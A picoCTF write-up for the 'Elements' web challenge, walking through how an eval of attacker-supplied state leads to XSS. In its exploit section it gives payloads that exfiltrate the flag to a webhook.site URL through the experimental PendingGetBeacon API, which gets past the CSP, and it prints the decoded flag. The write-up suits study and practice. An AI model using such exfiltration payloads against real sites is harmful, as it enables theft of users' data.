﻿# Elements - PicoCTF

## index.mjs
### func createServer()
    createServer((req, res) => {	
		const  url  =  new  URL(req.url, 'http://127.0.0.1');
		const  csp  = 
	[
		"default-src 'none'",
		"style-src 'unsafe-inline'",
		"script-src 'unsafe-eval' 'self'",
		"frame-ancestors 'none'",
		"worker-src 'none'",
		"navigate-to 'none'"
	]

Noteable that CSP (Content Secure Policy) allows that `"script-src 'unsafe-eval' 'self'"`. This means JS can use dangerous function like `eval(), setTimeOut(), ...` for executation.

`"navigate-to 'none'"`  means that we can't use navigation here (window.location, window.open ...)

    if (req.headers.host  !==  '127.0.0.1:8080') {
    csp.push("connect-src https://elements.attest.lol/");
    }

if host header is not 127.0.0.1:8080 => fetch from https://elements.attest.lol/. Afterwards, nothing special until this

    else if (url.pathname === '/remoteCraft') {
    try {
        const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
        assert(typeof xss === 'string');
        assert(xss.length < 300);
        assert(recipe instanceof Array);
        assert(recipe.length < 50);
        for (const step of recipe) {
            assert(step instanceof Array);
            assert(step.length === 2);
            for (const element of step) {
                assert(typeof xss === 'string');
                assert(element.length < 50);
            }
        }
        visit({ recipe, xss });
    } catch(e) {
        console.error(e);
        return res.writeHead(400).end('invalid recipe!');
    }
    return res.end('visiting!');
}

In pathname /remoteCraft, we can put the parameter **recipe**  in the URL, then use function *assert()* to check the condition of parameter, if everything goes well => execute function *visit()*

```
const url1 = 'http://localhost:8080/remoteCraft?recipe={"recipe":[["Ash","Fire"]],"xss":"exampleString"}';
const url = new URL(url1);
const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
console.log(recipe);
console.log(xss);
```

After use a small JS to see what input and output look likes.

> So all what we need to do is modify the XSS part => Execute visit() => Get the flag of state object


### func visit()

	 async function visit(state) {

    if (visiting) return; 
		visiting = true;

    state = { ...state, flag }; // inherit state object, and has attribute flag:
    const userDataDir = await mkdtemp(join(tmpdir(), 'elements-')); // ex: /tmp/elements-r3k2P7

    await mkdir(join(userDataDir, 'Default'));
    await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({ // file JSON Preferences is stored at /tmp/elements-r3k2P7/Default/
        net: {
            network_prediction_options: 2 // content of preferences
        }
    }));

    const proc = spawn(
        '/usr/bin/chromium-browser-unstable', [
            `--user-data-dir=${userDataDir}`,
            '--profile-directory=Default',
            '--no-sandbox',
            '--js-flags=--noexpose_wasm,--jitless',
            '--disable-gpu',
            '--no-first-run',
            '--enable-experimental-web-platform-features',
            `http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}` // contain recipe and xss attribute
        ],
        { detached: true } // ensures the spawned process will run independently of the parent process, meaning it won't be terminated if the parent process (the Node.js app) exits.
    );

    await sleep(10000);
    try {
        process.kill(-proc.pid);
    } catch (e) {}
    await sleep(500);
    await rm(userDataDir, { recursive: true, force: true, maxRetries: 10 });
    visiting = false;
    }

As we can see that visit function, the input object has been inherited all attribute, additional has new attribute which is our flag

| state | new state  |
|--|--|
| recipe: [["Ash","Fire"],["Water","Steam"]] | recipe: [["Ash","Fire"],["Water","Steam"]] |
|xss: 'exampleString'|xss: 'exampleString'|
||flag: picoCTF{test_flag}|


Then new process "chromium" and access ```http://127.0.0.1:8080#${Buffer.from(JSON.stringify(state)).toString('base64')```
The arguments have its functionality but notable that:


- `--enable-experimental-web-platform-features` :  User can use experimental feature of chromium

After that, the server sleep 10s then kill all process, then remove the temporary directory.

## index.js

After skimming, i see that vulnerable code that the back-end allow by CSP: `"script-src 'unsafe-eval' 'self'"`

### func evaluate()
    const evaluate = (...items) => {
        const [a, b] = items.sort();
        for (const [ingredientA, ingredientB, result] of recipes) {
            if (ingredientA === a && ingredientB == b) {
                if (result === 'XSS' && state.xss) {
                    eval(state.xss);                                            
                }
                return result;
            }
        }
        return null;
    }

The function validate the elements, if its combined = "XSS" and JSON object **"state"** has attribute xss, then server execute it. This is the main part of this attack.

CTRL-F the this function, this only called in 2 another location: create() and last try/catch block. The function create() seems nothing special, just check the elements and if new element found, store it in a map found[].

### try/catch()

    try {
        state = JSON.parse(atob(window.location.hash.slice(1)));
        for (const [a, b] of state.recipe) {
            if (!found.has(a) || !found.has(b)) {
                break;
            }
            const result = evaluate(a, b);
            found.set(result, elements.get(result));
        }
    } catch(e) {}

There we have **state** is the JSON obj after base64 decoded `atob()`
 `window.location.hash.slice(1)` is taking the after "#" part of current URL.
  Example: http://example.com/#123abc if go on this func => 123abc

Then if statement check the ingredient element already founded => execute the `evaluate()` function and add result element to the founded map.

## Exploit

So, i have to take my time for playing this game till i got XSS (waste of time) to met the condition of evaluate() function.

Take first step with simple payload: `{"recipe":[["Exploit","Web Design"]],"xss":"alert('1')"}`
=> http://localhost:8080/#eyJyZWNpcGUiOltbIkV4cGxvaXQiLCJXZWIgRGVzaWduIl1dLCJ4c3MiOiJhbGVydCgnMScpIn0=

Its worked!

Chromium stored the attribute of **state** so i need to see content of state, this bring me to this payload:

    {"recipe":[["Exploit","Web Design"]],"xss":"let output='';for(const[key,value]of Object.entries(state)){output+=`${key}:${value}`;}alert(output);"}

Encode it and bring to the URL, also worked too! 
=> recipe:Exploit,Web Designxss:let output='';for(const[key,value]of Object.entries(state)){output+=`${key}:${value}`;}alert(output);

Its processing in Chromium, so i need something that return the flag to me. THAT WHY I USED WEBHOOK!

=> payload: ``` http://localhost:8080/remoteCraft?recipe={"recipe":[["Exploit", "Web Design"]],"xss":"let output='';for(const[key,value]of Object.entries(state)){output+=`${key}:${value}`;};window.location = 'https://webhook.site/09e19f10-a88e-405c-b6c1-4870e0c497d5/?e=' + output"}```

The Chromium processing, then 

    http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}
accessed by browser =>  **evaluate()** executed => **eval()** execute => **XSS** !!!

Unfortunately, despite many tries, the webhook cant catch my request, then i realize that `"navigate-to 'none'"` in CSP  :(

After hours, i found that we can use `window.location.hash.slice(1)` again to get the flag, cause our location is indeed containing the flag. But we don't have anything to return it. 

So desperately, so i checked the solution..., then thing i missed is: `--enable-experimental-web-platform-features`. AISHHHH! im done, its so tricky, there are a API in testing Chrome Feature that is **PendingBeacon** class, which has PendingGetBeacon() API supports JavaScript. Normally the testing feature is not affected by the CSP.
 
 [Here is the document](https://chromium.googlesource.com/chromium/src/+/refs/tags/107.0.5304.8/docs/experiments/page-unload-beacon.md)

I have tried another API but its seem not work with this time.

=> payload:  ``` http://localhost:8080/remoteCraft?recipe={"recipe":[["Exploit", "Web Design"]],"xss":"new PendingGetBeacon('https://webhook.site/09e19f10-a88e-405c-b6c1-4870e0c497d5/?e=' + window.location.hash.slice(1), {timeout: 1000});"}```


Then we got base64 request from webhook:
```https://webhook.site/09e19f10-a88e-405c-b6c1-4870e0c497d5/?e=eyJyZWNpcGUiOltbIkV4cGxvaXQiLCJXZWIgRGVzaWduIl1dLCJ4c3MiOiJuZXcgUGVuZGluZ0dldEJlYWNvbignaHR0cHM6Ly93ZWJob29rLnNpdGUvMDllMTlmMTAtYTg4ZS00MDVjLWI2YzEtNDg3MGUwYzQ5N2Q1Lz9lPScgKyB3aW5kb3cubG9jYXRpb24uaGFzaC5zbGljZSgxKSwge3RpbWVvdXQ6IDEwMDB9KTsiLCJmbGFnIjoicGljb0NURntsaXR0bGVfYWxjaGVteV93YXNfdGhlXzBnX2dhbWVfZG9lc19hbnlvbmVfcmVtZW1iM3JfOTg4OWZkNGF9IGJ0dyBjb250YWN0IG1lIG9uIGRpc2NvcmQgd2l0aCB1ciBzb2x1dGlvbiB0aGFua3MgQGVoaHRoaW5nXG4ifQ==```

Decode => Flag: picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}





 
















